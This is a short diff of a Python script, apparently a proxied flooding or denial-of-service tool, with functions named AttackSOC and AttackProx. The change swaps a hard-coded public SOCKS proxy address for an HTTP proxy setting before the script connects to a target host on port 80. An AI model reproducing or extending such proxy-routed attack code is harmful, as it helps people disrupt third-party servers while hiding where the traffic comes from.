@@ -61,9 +61,10 @@ def AttackSOC(req):
 # socks.set_default_proxy()
 def AttackProx(req):
     global rs, closed
-    socks.set_default_proxy(proxy_type=2, addr='72.195.34.59', port=4145)
     s = socks.socksocket()
     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+    s.set_proxy(socks.HTTP)
+#    socks.set_default_proxy(proxy_type=2, addr='72.195.34.59', port=4145)
     s.connect((str(host), int(80)))
     s.settimeout(5)
     # print(s.proxy, s.timeout)
